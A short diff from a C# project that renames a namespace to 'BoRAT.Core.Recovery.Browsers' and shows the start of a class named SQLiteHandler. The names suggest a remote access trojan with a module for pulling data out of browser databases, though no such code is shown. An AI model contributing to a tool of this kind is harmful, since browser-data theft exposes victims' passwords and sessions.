@@ -5,7 +5,7 @@ using System.IO;
 using System.Runtime.InteropServices;
 using System.Text;
 
-namespace BoRAT.Recovery.Browsers
+namespace BoRAT.Core.Recovery.Browsers
 {
     public class SQLiteHandler
     {
